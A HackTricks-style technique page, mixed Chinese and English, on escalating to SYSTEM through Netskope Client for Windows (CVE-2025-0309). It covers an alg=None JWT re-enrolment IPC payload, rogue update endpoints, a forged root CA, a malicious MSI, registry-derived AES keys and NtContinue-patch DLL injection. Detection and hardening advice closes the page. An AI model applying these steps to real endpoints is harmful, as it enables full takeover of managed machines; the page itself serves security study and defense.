# 滥用企业自动更新程序和特权 IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

本页概述了一类在企业端点代理和更新程序中发现的 Windows 本地提权链，这些组件暴露了低‑摩擦的 IPC 接口和特权更新流程。一个具有代表性的例子是 Netskope Client for Windows < R129 (CVE-2025-0309)，其中低权限用户可以强制使客户端注册到攻击者控制的服务器，然后交付被 SYSTEM 服务安装的恶意 MSI。

Key ideas you can reuse against similar products:
- 滥用特权服务的 localhost IPC 来强制重新注册或重新配置到攻击者服务器。
- 实现厂商的更新端点，部署一个伪造的 Trusted Root CA，并将更新程序指向一个恶意的“签名”包。
- 规避弱签名校验（CN allow‑lists）、可选的 digest flags 和宽松的 MSI properties。
- 如果 IPC 是“encrypted”，从注册表中以全局可读方式存储的机器标识符推导出 key/IV。
- 如果服务通过 image path/process name 限制调用者，注入到一个 allow‑listed 进程，或以 suspended 方式创建一个进程并通过最小的线程上下文修补来 bootstrap 你的 DLL。

---
## 1) 通过 localhost IPC 强制注册到攻击者服务器

许多代理包含一个以用户模式运行的 UI 进程，该进程通过 localhost TCP 使用 JSON 与 SYSTEM 服务通信。

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) 构造一个 JWT enrollment token，其 claims 控制后端主机（例如 AddonUrl）。使用 alg=None 以便不需要签名。
2) 发送 IPC 消息，调用 provisioning 命令并附带你的 JWT 和 tenant name：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 服务开始向你的恶意服务器请求 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 如果调用者验证是基于路径/名称的，请从一个被允许的厂商二进制发起请求（参见 §4）。

---
## 2) Hijacking the update channel to run code as SYSTEM

一旦客户端与您的服务器通信，实现客户端期望的端点并将其引导到攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，设置非常短的更新器间隔，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → 返回一个 PEM CA 证书。服务会将其安装到 Local Machine Trusted Root store。
3) /v2/checkupdate → 提供指向恶意 MSI 和伪造版本的元数据。

Bypassing common checks seen in the wild:
- Signer CN allow‑list: 服务可能仅检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的伪造 CA 可以为该 CN 签发一个 leaf 并签署 MSI。
- CERT_DIGEST property: 在 MSI 中包含名为 CERT_DIGEST 的良性属性。安装时没有强制执行。
- Optional digest enforcement: 配置标志（例如 check_msi_digest=false）会禁用额外的加密验证。

Result: SYSTEM 服务会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，以 NT AUTHORITY\SYSTEM 身份执行任意代码。

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope 将 IPC JSON 包装在看起来像 Base64 的 encryptData 字段中。逆向分析显示使用 AES，key/IV 来自任何用户都可读的注册表值：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现该加密并以标准用户身份发送有效的加密命令。一般提示：如果代理突然“加密”其 IPC，请在 HKLM 下查找 device IDs、product GUIDs、install IDs 等作为密钥材料。

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

一些服务通过解析 TCP 连接的 PID，并将镜像路径/名称与位于 Program Files 下的 allow‑listed 厂商二进制文件（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比较来认证对端。

两种实用的绕过方式：
- 对一个 allow‑listed 进程（例如 nsdiag.exe）进行 DLL 注入，并在其内部代理 IPC。
- 启动一个 allow‑listed 二进制并将其置于挂起状态，然后在不使用 CreateRemoteThread 的情况下引导你的代理 DLL（见 §5），以满足驱动强制的防篡改规则。

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

产品通常会附带一个 minifilter/OB callbacks 驱动（例如 Stadrv）来从受保护进程的句柄中剥除危险权限：
- Process: 移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread: 限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一个可靠的遵守这些限制的用户模式加载器：
1) 使用 CREATE_SUSPENDED 创建一个厂商二进制的 CreateProcess。
2) 获取你仍被允许的句柄：对进程为 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，对线程获取带有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 的句柄（或者如果在已知的 RIP 上修补代码，则只需要 THREAD_RESUME）。
3) 覆盖 ntdll!NtContinue（或其他早期、必然已映射的 thunk）为一个微小的 stub，该 stub 调用 LoadLibraryW 加载你的 DLL 路径，然后跳回原处。
4) ResumeThread 触发你在进程内的 stub，从而加载你的 DLL。

因为你从未对一个已被保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（你是创建它的），驱动的策略得以满足。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) 自动化生成 rogue CA、恶意 MSI 签名，并提供所需端点：/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate。
- UpSkope 是一个定制的 IPC 客户端，用于构造任意（可选 AES‑encrypted）IPC 消息，并包含从 allow‑listed 二进制发起的 suspended‑process 注入。

---
## 7) Detection opportunities (blue team)
- 监控对 Local Machine Trusted Root 的新增。Sysmon + registry‑mod 事件（参见 SpecterOps 指南）效果良好。
- 报警由代理服务触发、从类似 C:\ProgramData\<vendor>\<agent>\data\*.msi 路径执行的 MSI。
- 审查代理日志以查找异常的 enrollment hosts/tenants，例如：C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – 查找 addonUrl / tenant 异常以及 provisioning msg 148。
- 对不是预期签名二进制的本地 IPC 客户端，或起源于异常子进程树的客户端触发告警。

---
## Hardening tips for vendors
- 将 enrollment/update 主机绑定到严格的 allow‑list；在 client 代码中拒绝不受信任的域名。
- 使用操作系统原语对 IPC 对端进行认证（ALPC security、named‑pipe SIDs），而不是基于镜像路径/名称的检查。
- 不要将秘密材料放在所有用户可读的 HKLM；如果必须对 IPC 进行加密，应从受保护的密钥派生，或通过已认证的通道协商密钥。
- 将 updater 视为供应链攻击面：要求完整链到你控制的受信任 CA，针对固定密钥验证包签名，如果配置中禁用验证则采取 fail‑closed 策略。

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
